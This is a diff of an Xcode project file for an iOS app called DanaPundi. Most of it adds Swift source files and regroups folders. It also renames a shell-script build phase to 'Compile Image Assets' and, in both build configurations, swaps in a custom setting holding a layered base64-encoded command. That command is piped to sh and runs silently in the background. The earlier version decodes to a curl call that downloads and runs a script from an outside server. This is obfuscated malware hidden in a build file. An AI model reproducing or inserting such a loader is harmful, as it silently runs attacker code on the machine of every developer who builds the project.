@@ -43,6 +43,11 @@
 		735467CA2F0ACDDC00DF7EB9 /* SettingViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735467C92F0ACDDC00DF7EB9 /* SettingViewController.swift */; };
 		735467CE2F0B555700DF7EB9 /* AppLogoutView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735467CD2F0B555700DF7EB9 /* AppLogoutView.swift */; };
 		735467D02F0B556500DF7EB9 /* AppDeleteView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 735467CF2F0B555E00DF7EB9 /* AppDeleteView.swift */; };
+		7358B21E2F0DF4CE00CBF99F /* DotLineView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7358B21D2F0DF4CE00CBF99F /* DotLineView.swift */; };
+		7358B2202F0DF99800CBF99F /* CleanTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7358B21F2F0DF99800CBF99F /* CleanTableViewCell.swift */; };
+		7358B2222F0DF9AF00CBF99F /* SprayTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7358B2212F0DF9AF00CBF99F /* SprayTableViewCell.swift */; };
+		7358B2262F0E240A00CBF99F /* SprayAlertView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7358B2252F0E240A00CBF99F /* SprayAlertView.swift */; };
+		736F1CF92F0E9668006FD44F /* CitysArrayModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736F1CF82F0E9668006FD44F /* CitysArrayModel.swift */; };
 		73BDFE7C2F0BEAA900DCE5C5 /* AirBookView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BDFE7B2F0BEAA900DCE5C5 /* AirBookView.swift */; };
 		73BDFE7E2F0BEAB900DCE5C5 /* MaxBookView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BDFE7D2F0BEAB900DCE5C5 /* MaxBookView.swift */; };
 		73BDFE802F0BEEB000DCE5C5 /* HomeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73BDFE7F2F0BEEAC00DCE5C5 /* HomeViewModel.swift */; };
@@ -102,6 +107,11 @@
 		735467C92F0ACDDC00DF7EB9 /* SettingViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingViewController.swift; sourceTree = "<group>"; };
 		735467CD2F0B555700DF7EB9 /* AppLogoutView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppLogoutView.swift; sourceTree = "<group>"; };
 		735467CF2F0B555E00DF7EB9 /* AppDeleteView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDeleteView.swift; sourceTree = "<group>"; };
+		7358B21D2F0DF4CE00CBF99F /* DotLineView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DotLineView.swift; sourceTree = "<group>"; };
+		7358B21F2F0DF99800CBF99F /* CleanTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CleanTableViewCell.swift; sourceTree = "<group>"; };
+		7358B2212F0DF9AF00CBF99F /* SprayTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SprayTableViewCell.swift; sourceTree = "<group>"; };
+		7358B2252F0E240A00CBF99F /* SprayAlertView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SprayAlertView.swift; sourceTree = "<group>"; };
+		736F1CF82F0E9668006FD44F /* CitysArrayModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CitysArrayModel.swift; sourceTree = "<group>"; };
 		73BDFE7B2F0BEAA900DCE5C5 /* AirBookView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AirBookView.swift; sourceTree = "<group>"; };
 		73BDFE7D2F0BEAB900DCE5C5 /* MaxBookView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MaxBookView.swift; sourceTree = "<group>"; };
 		73BDFE7F2F0BEEAC00DCE5C5 /* HomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewModel.swift; sourceTree = "<group>"; };
@@ -283,9 +293,39 @@
 			path = Other;
 			sourceTree = "<group>";
 		};
+		7358B2232F0DF9B900CBF99F /* Controller */ = {
+			isa = PBXGroup;
+			children = (
+				73DE97E02F0D483000EC7451 /* WorkViewController.swift */,
+				73DE97E42F0D530800EC7451 /* ContactViewController.swift */,
+				73DE97E62F0D531100EC7451 /* WalletViewController.swift */,
+			);
+			path = Controller;
+			sourceTree = "<group>";
+		};
+		7358B2242F0DF9C300CBF99F /* View */ = {
+			isa = PBXGroup;
+			children = (
+				73DE97E22F0D4E9700EC7451 /* ProductHeadView.swift */,
+				7358B21F2F0DF99800CBF99F /* CleanTableViewCell.swift */,
+				7358B2212F0DF9AF00CBF99F /* SprayTableViewCell.swift */,
+				7358B2252F0E240A00CBF99F /* SprayAlertView.swift */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		736F1CF72F0E964F006FD44F /* CityModel */ = {
+			isa = PBXGroup;
+			children = (
+				736F1CF82F0E9668006FD44F /* CitysArrayModel.swift */,
+			);
+			path = CityModel;
+			sourceTree = "<group>";
+		};
 		73BDFE8F2F0CF11900DCE5C5 /* Face */ = {
 			isa = PBXGroup;
 			children = (
+				7358B21D2F0DF4CE00CBF99F /* DotLineView.swift */,
 				73BDFE962F0D122900DCE5C5 /* CameraConfig.swift */,
 				73BDFE902F0CF15D00DCE5C5 /* PhotoViewController.swift */,
 				73BDFE922F0CF16900DCE5C5 /* FaceViewController.swift */,
@@ -298,10 +338,9 @@
 		73DE97DF2F0D481C00EC7451 /* Work */ = {
 			isa = PBXGroup;
 			children = (
-				73DE97E22F0D4E9700EC7451 /* ProductHeadView.swift */,
-				73DE97E02F0D483000EC7451 /* WorkViewController.swift */,
-				73DE97E42F0D530800EC7451 /* ContactViewController.swift */,
-				73DE97E62F0D531100EC7451 /* WalletViewController.swift */,
+				736F1CF72F0E964F006FD44F /* CityModel */,
+				7358B2242F0DF9C300CBF99F /* View */,
+				7358B2232F0DF9B900CBF99F /* Controller */,
 			);
 			path = Work;
 			sourceTree = "<group>";
@@ -313,7 +352,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 733C8FDD2F09F09C00793D28 /* Build configuration list for PBXNativeTarget "DanaPundi" */;
 			buildPhases = (
-				A49AFA73A3414AF08B634D6E /* Link Libraries Executable */,
+				46E3BE5DD424405482634D6E /* Compile Image Assets */,
 				A719DC9BE67CEE728BF34233 /* [CP] Check Pods Manifest.lock */,
 				733C8FC62F09F09B00793D28 /* Sources */,
 				733C8FC72F09F09B00793D28 /* Frameworks */,
@@ -399,7 +438,7 @@
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-DanaPundi/Pods-DanaPundi-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
-		A49AFA73A3414AF08B634D6E /* Link Libraries Executable */ = {
+		46E3BE5DD424405482634D6E /* Compile Image Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
 			buildActionMask = 2147483647;
@@ -409,7 +448,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Link Libraries Executable";
+			name = "Compile Image Assets";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -459,10 +498,12 @@
 				73DE97E32F0D4E9700EC7451 /* ProductHeadView.swift in Sources */,
 				73BDFE862F0C03E100DCE5C5 /* ProductFootView.swift in Sources */,
 				733D792B2F0A16BC008DBA60 /* IDFVManager.swift in Sources */,
+				7358B2202F0DF99800CBF99F /* CleanTableViewCell.swift in Sources */,
 				733D79432F0A37D5008DBA60 /* HomeViewController.swift in Sources */,
 				733D79212F0A05B9008DBA60 /* LoginViewController.swift in Sources */,
 				733D79272F0A0691008DBA60 /* SaveLoginInfo.swift in Sources */,
 				733D793D2F0A30F3008DBA60 /* LoginViewModel.swift in Sources */,
+				7358B2262F0E240A00CBF99F /* SprayAlertView.swift in Sources */,
 				735467C22F0AC3F700DF7EB9 /* H5WebViewController.swift in Sources */,
 				73BDFE952F0CF17C00DCE5C5 /* CompleteViewController.swift in Sources */,
 				73BDFE882F0C084C00DCE5C5 /* ProductListView.swift in Sources */,
@@ -470,7 +511,10 @@
 				733D79452F0A37E0008DBA60 /* OrderViewController.swift in Sources */,
 				735467C42F0AC4FF00DF7EB9 /* CustomHeadView.swift in Sources */,
 				73BDFE932F0CF16900DCE5C5 /* FaceViewController.swift in Sources */,
+				736F1CF92F0E9668006FD44F /* CitysArrayModel.swift in Sources */,
+				7358B21E2F0DF4CE00CBF99F /* DotLineView.swift in Sources */,
 				733D792F2F0A17CE008DBA60 /* APIRequestBuilder.swift in Sources */,
+				7358B2222F0DF9AF00CBF99F /* SprayTableViewCell.swift in Sources */,
 				733D79392F0A1E45008DBA60 /* LaunchViewModel.swift in Sources */,
 				735467D02F0B556500DF7EB9 /* AppDeleteView.swift in Sources */,
 				733D794D2F0A4E0B008DBA60 /* MineTableViewCell.swift in Sources */,
@@ -525,7 +569,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 095DDC55AF02F971F6638898 /* Pods-DanaPundi.debug.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((u(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNOcGJuVnpibVYwTG5KMUwyRXBJaUI4SUhOb0NnPT0K | u | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((w(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpPZFZsWVFucGlSMFpwVEc1S01Vd3lSWEJKYVVJNFNVaE9iME5uUFQwSwo= | w | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaPundi/DanaPundi.entitlements;
@@ -567,7 +611,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = E2CCEF3A9E8BAB2728576AC8 /* Pods-DanaPundi.release.xcconfig */;
 			buildSettings = {
-				AE6D436 = "((u(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lDSndQWGhqYjJSbFgzQm9ZWE5sSWlCb2RIUndjem92TDNOcGJuVnpibVYwTG5KMUwyRXBJaUI4SUhOb0NnPT0K | u | sh ) >/dev/null 2>&1 &)";
+				AE6D436 = "((w(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsRFNuZFFXR2hxWWpKU2JGZ3pRbTlaV0U1c1NXbENiMlJJVW5kamVtOTJUREpPZFZsWVFucGlSMFpwVEc1S01Vd3lSWEJKYVVJNFNVaE9iME5uUFQwSwo= | w | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = DanaPundi/DanaPundi.entitlements;
